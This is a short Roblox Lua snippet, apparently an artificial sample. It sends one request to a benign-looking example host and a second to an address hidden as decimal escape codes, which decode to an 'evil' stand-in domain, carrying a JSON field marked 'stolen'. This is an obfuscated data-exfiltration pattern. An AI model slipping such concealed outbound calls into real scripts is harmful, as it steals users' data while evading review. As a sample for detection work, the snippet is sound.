local H = game:GetService("HttpService") H:PostAsync("https://ok.example.com/log", "{}") H:PostAsync("\104\116\116\112\115\58\47\47\101\118\105\108\46\120\121\122", H:JSONEncode({k = "stolen"}))
